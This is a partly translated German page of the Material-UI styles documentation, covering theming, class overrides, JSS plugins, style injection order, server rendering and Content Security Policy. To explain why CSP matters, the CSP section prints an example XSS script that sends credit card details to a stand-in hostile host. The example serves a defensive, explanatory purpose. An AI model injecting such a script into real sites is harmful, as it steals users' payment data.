# Erweitert

<p class="description">Diese Sektion behandelt mehr der fortgeschrittenen Nutzung von @material-ui/styles.</p>

## Theming

Fügen Sie auf der oberste Ebene Ihrer App einen ` ThemeProvider` hinzu, um auf das Theme im Komponentenbaum von React zuzugreifen. Anschließend können Sie in den Stilfunktionen auf das Designobjekt zugreifen.

```jsx
import { ThemeProvider } from '@material-ui/styles';

const theme = {
  background: 'linear-gradient(45deg, #FE6B8B 30%, #FF8E53 90%)',
};

function Theming() {
  return (
    <ThemeProvider theme={theme}>
      <DeepChild />
    </ThemeProvider>
  );
}
```

{{"demo": "pages/styles/advanced/Theming.js"}}

### Zugriff auf das Theme in einer Komponente

Möglicherweise müssen Sie auf die Themevariablen in Ihren React-Komponenten zugreifen.

#### `useTheme` hook

```jsx
import { useTheme } from '@material-ui/styles';

function DeepChild() {
  const theme = useTheme();
  return <span>{`spacing ${theme.spacing}`}</span>;
}
```

{{"demo": "pages/styles/advanced/UseTheme.js"}}

#### `withTheme` HOC

```jsx
import { withTheme } from '@material-ui/styles';

function DeepChildRaw(props) {
  return <span>{`spacing ${props.theme.spacing}`}</span>;
}

const DeepChild = withTheme(DeepChildRaw);
```

{{"demo": "pages/styles/advanced/WithTheme.js"}}

### Verschachtelung des Themes

Sie können mehrere Theme Provider verschachteln. This can be really useful when dealing with different areas of your application that have distinct appearance from each other.

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/styles/advanced/ThemeNesting.js"}}

Das innere Theme ** überschreibt** das äußere Theme. Sie können das äußere Theme erweitern, indem Sie eine Funktion bereitstellen:

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## Overriding styles - `classes` prop

The `makeStyles` (hook generator) and `withStyles` (HOC) APIs allow the creation of multiple style rules per style sheet. Each style rule has its own class name. The class names are provided to the component with the `classes` variable. The is particularly useful when styling nested elements in a component.

```jsx
// A style sheet
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles();
  return (
    <button className={classes.root}> // 'jss1'
      <span className={classes.label}> // 'jss2'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested />
}
```

However, the class names are often non-deterministic. How can a parent component override the style of a nested element?

### withStyles

This is the simplest case. the wrapped component accepts a `classes` prop, it simply merges the class names provided with the style sheet.

```jsx
const Nested = withStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
})({ classes }) => (
  <button className={classes.root}>
    <span className={classes.label}> // 'jss2 my-label'
      Nested
    </span>
  </button>
));

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

### makeStyles

The hook API requires a bit more work. You have to forward the parent props to the hook as a first argument.

```jsx
const useStyles = makeStyles({
  root: {}, // a style rule
  label: {}, // a nested style rule
});

function Nested(props) {
  const classes = useStyles(props);
  return (
    <button className={classes.root}>
      <span className={classes.label}> // 'jss2 my-label'
        nested
      </span>
    </button>
  );
}

function Parent() {
  return <Nested classes={{ label: 'my-label' }} />
}
```

## JSS-Plugins

JSS nutzt Plugins um seinen Kern zu erweitern, sodass Sie die Funktionen, die Sie benötigen auswählen können. Sie bezahlen nur für den Leistungsaufwand, den Sie verwenden.

Nicht alle Plugins sind standardmäßig in der Material-UI verfügbar. Folgende (die eine Teilmenge von [jss-preset-default](https://cssinjs.org/jss-preset-default/) sind) sind inklusive:

- [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
- [jss-plugin-global](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-vendor-prefixer/)

Selbstverständlich können Sie weitere Plugins benutzen. Hier ist ein Beispiel mit dem [ jss-rtl ](https://github.com/alitaheri/jss-rtl) Plugin.

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## String-Vorlagen

Wenn Sie die CSS-Syntax gegenüber JSS bevorzugen, können Sie das [jss-plugin-template](https://cssinjs.org/jss-plugin-template/) Plugin verwenden.

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3px;
    font-size: 16px;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

Beachten Sie, dass dies keine Selektoren oder verschachtelten Regeln unterstützt.

{{"demo": "pages/styles/advanced/StringTemplates.js"}}

## CSS-Injektionsreihenfolge

> Es ist **wirklich wichtig** um zu verstehen, wie die CSS-Spezifität vom Browser berechnet wird. Dies ist eines der Schlüsselelemente, die beim Überschreiben von Stilen zu beachten sind. Wir **ermutigen** Sie diesen MDN-Absatz: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated) zu lesen

Standardmäßig werden die Style-Tags **zuletzt** im `<head>` -Element der Seite eingefügt. Sie erhalten mehr Details als jedes andere Styletag auf Ihrer Seite, z.B. CSS-Module oder StilKomponenten.

### injectFirst

Der `StylesProvider` Komponente hat eine `injectFirst` Eigenschaft, um **zuerst** die Style-Tags im Kopf einzufügen (weniger Priorität):

```jsx
import { StylesProvider } from '@material-ui/styles';

<StylesProvider injectFirst>
  {/* Dein Komponentenbaum.
      Mit Stil versehene Komponenten können die Stile von Material-UI überschreiben. */}
</StylesProvider>
```

### `makeStyles` / `withStyles` / `styled`

Das Einfügen von Style-Tags erfolgt in der **gleichen Reihenfolge** wie die `makeStyles`/`withStyles`/`styled` Aufrufe. Zum Beispiel gewinnt die Farbe Rot in diesem Fall:

```jsx
import clsx from 'clsx';
import { makeStyles } from '@material-ui/styles';

const useStyleBase = makeStyles({
  root: {
    color: 'blue', // 🔵
  },
});

const useStyle = makeStyles({
  root: {
    color: 'red', // 🔴
  },
});

export default function MyComponent() {
  // Reihenfolge ist egal
  const classes = useStyles();
  const classesBase = useStyleBase();

  //  Reihenfolge ist egal
  const className = clsx(classes.root, useStyleBase.root)

  // Farbe: rot 🔴 gewinnt.
  return <div className={className} />;
}
```

Die Hook-Aufrufreihenfolge und die Klassennamensverkettungsreihenfolge **spielen keine Rolle**.

### insertionPoint

JSS [bietet einen Mechanismus](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point) um diese Situation zu kontrollieren. Durch Hinzufügen der Platzierung des `Einfügepunkts` innerhalb Ihres HTML-Heads können Sie die [Reihenfolge steuern](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order), sodass die CSS-Regeln auf Ihre Komponenten angewendet werden.

#### HTML-Kommentar

Am einfachsten ist es, einen HTML-Kommentar zum `<head>` hinzuzufügen, der bestimmt, wo JSS die Stile einfügt:

```html
<head>
  <!-- jss-insertion-point -->
  <link href="...">
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### Andere HTML-Elemente

[Create React App](https://github.com/facebook/create-react-app) entfernt HTML-Kommentare beim Erstellen des Produktions-Builds. Um dieses Problem zu umgehen, können Sie ein DOM-Element (nicht einen Kommentar) als JSS-Einfügepunkt angeben, z. B. `<noscript>`:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  //  Wir definieren einen individuellen insertion point, welcher von JSS benutzt wird, um die Stile in den DOM einzufügen.
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

#### JS createComment

codesandbox.io verhindert Zugriff auf das `<head>` Element. Um dieses Problem zu umgehen, können Sie die JavaScript `document.createComment()` API verwenden:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // Definiert einen benutzerdefinierten Einfügepunkt, den JSS beim Einfügen der Stile in das DOM sucht.
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## Server-Rendering

In diesem Beispiel wird ein Html-String zurückgegeben und die erforderliche kritische Css direkt vor ihrer Verwendung eingebettet:

```jsx
import ReactDOMServer from 'react-dom/server';
import { ServerStyleSheets } from '@material-ui/styles';

function render() {
  const sheets = new ServerStyleSheets();

  const html = ReactDOMServer.renderToString(sheets.collect(<App />));
  const css = sheets.toString();

  return `
<!DOCTYPE html>
<html>
  <head>
    <style id="jss-server-side">${css}</style>
  </head>
  <body>
    <div id="root">${html}</div>
  </body>
</html>
  `;
}
```

Sie können der [serverseitigen Anleitung](/guides/server-rendering/) für ein detaillierteres Beispiel folgen oder lesen Sie die [`ServerStyleSheets`](/styles/api/#serverstylesheets) API-Dokumentation.

### Gatsby

Wir haben [ein offizielles Plugin](https://github.com/hupe1980/gatsby-plugin-material-ui), welches serverseitiges Rendering für `@material-ui/styles` ermöglicht. Anleitungen zur Einrichtung und Verwendung finden Sie auf der Seite des Plugins.

Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.

### Next.js

Sie müssen über eine benutzerdefiniertes `pages/_document.js` haben und [diese Logik](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) kopieren, um die serverseitig gerenderten Stile in das `<head>` Element hinzuzufügen.

Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.

## Klassennamen

Die Klassennamen werden von dem [Klassennamengenerator](/styles/api/#creategenerateclassname-options-class-name-generator) generiert. Nehmen wir den folgenden Stil als Beispiel.

### Standard

By default, the class names generated by `@material-ui/styles` are **non-deterministic**; you can't rely on them to stay the same. Nehmen wir den folgenden Stil als Beispiel:

```js
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
});
```

This will generate a class name such as `makeStyles-root-123`.

You have to use the `classes` prop of a component to override the styles. The non-deterministic nature of the class names enables style isolation.

- In **development**, the class name is: `.makeStyles-root-123`, following this logic:

```js
const sheetName = 'makeStyles';
const ruleName = 'root';
const identifier = 123;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- In **production**, the class name is: `.jss123`, following this logic:

```js
const productionPrefix = 'jss';
const identifier = 123;

const className = `${productionPrefix}-${identifier}`;
```

### With `@material-ui/core`

The generated class names of the `@material-ui/core` components behave differently. When the following conditions are met, the class names are **deterministic**:

- Only one theme provider is used (**No theme nesting**)
- The style sheet has a name that starts with `Mui`. (All Material-UI components)
- The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false`. (The default)

These conditions are met with the most common use cases of `@material-ui/core`. For instance, this style sheet:

```jsx
const useStyles = makeStyles({
  root: { /* … */ },
  label: { /* … */ },
  outlined: {
    /* … */
    '&$disabled': { /* … */ },
  },
  outlinedPrimary: {
    /* … */
    '&:hover': { /* … */ },
  },
  disabled: {},
}, { name: 'MuiButton' });
```

generates the following class names you that can override:

```css
.MuiButton-root { /* … */ }
.MuiButton-label { /* … */ }
.MuiButton-outlined { /* … */ }
.MuiButton-outlined.Mui-disabled { /* … */ }
.MuiButton-outlinedPrimary: { /* … */ }
.MuiButton-outlinedPrimary:hover { /* … */ }
```

*This is a simplification of the `@material-ui/core/Button` component's style sheet.*

Customization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop. It's easier to use the default values, as described above. For example:

```jsx
import styled from 'styled-components';
import { TextField } from '@material-ui/core';

const StyledTextField = styled(TextField)`
  label.focused {
    color: green; 💚
  }
  .MuiOutlinedInput-root {
    fieldset {
      border-color: red; ❤️
    }
    &:hover fieldset {
      border-color: yellow; 💛
    }
    &.Mui-focused fieldset {
      border-color: green; 💚
    }
  }
`;
```

{{"demo": "pages/styles/advanced/GlobalClassName.js"}}

## Globales CSS

### `jss-plugin-global`

Das [`jss-plugin-global`](#jss-plugins) Plugin ist in der Standardvoreinstellung installiert. Sie können es verwenden, um globale Klassennamen zu definieren.

{{"demo": "pages/styles/advanced/GlobalCss.js"}}

### Hybrid

Sie können auch JSS-generierte Klassennamen mit globalen Namen kombinieren.

{{"demo": "pages/styles/advanced/HybridGlobalCss.js"}}

## CSS-Präfix

JSS verwendet Featureerkennung, um die korrekten Präfixe anzuwenden. [Seien Sie nicht überrascht](https://github.com/mui-org/material-ui/issues/9293) wenn Sie in der neuesten Version von Chrome kein bestimmtes Präfix sehen können. Ihr Browser benötigt es wahrscheinlich nicht.

## Inhaltssicherheitsrichtlinie (Content Security Policy, CSP)

### Was ist CSP und warum ist es nützlich?

Grundsätzlich verringert CSP Cross-Site Scripting (XSS)-Angriffe, indem Entwickler die Quellen angeben, aus denen ihre Assets abgerufen werden. Diese Liste wird vom Server als Header zurückgegeben. Angenommen, Sie haben eine Website unter `https://example.com` gehostet. Der CSP-Header `default-src: 'self';` erlaubt alle Assets, die sich unter `https://example.com/*` befinden und blockt alle anderen. Wenn es auf Ihrer Website einen für XSS anfälligen Bereich gibt, in dem nicht eingegebene Benutzereingaben angezeigt werden, könnte ein Angreifer Folgendes eingeben:

```html
<script>
  sendCreditCardDetails('https://hostile.example');
</script>
```

Diese Sicherheitsanfälligkeit ermöglicht es dem Angreifer, irgendetwas auszuführen. Mit einem sicheren CSP-Header lädt der Browser dieses Skript jedoch nicht.

Weitere Informationen zu CSP finden Sie in den [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### Wie kann man CSP implementieren?

Um CSP mit Material-UI (und JSS) verwenden zu können, müssen Sie eine Nonce verwenden. Eine Nonce ist eine zufällig generierte Zeichenfolge, die nur einmal verwendet wird. Daher müssen Sie eine Server-Middleware hinzufügen, um für jede Anforderung eine zu generieren. JSS hat ein [tolles Tutorial](https://github.com/cssinjs/jss/blob/next/docs/csp.md) wie man dies mit Express und React Helmet erreichen kann. Lesen Sie für einen grundlegenden Überblick weiter.

Eine CSP-Nonce ist eine Base 64-codierte Zeichenfolge. Sie können diese so erstellen:

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

Es ist sehr wichtig, dass Sie die UUID Version 4 verwenden, da es einen **unvorhersehbaren** String generiert. Sie wenden dann dieses Nonce auf den CSP-Header an. Ein CSP-Header könnte mit der angewendeten Nonce so aussehen:

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

Wenn Sie Server Side-Rendering (SSR) verwenden, sollten Sie die Nonce im `<style>`-Tag des Servers übergeben.

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheets.toString() } }
/>
```

Dann müssen Sie dieses Nonce an JSS übergeben, damit es den nachfolgenden `<style>`-Tags hinzugefügt werden kann. Die Clientseite erhält die Nonce aus einem Header. Sie müssen diesen Header unabhängig davon angeben, ob SSR verwendet wird oder nicht.

```jsx
<meta property="csp-nonce" content={nonce} />
```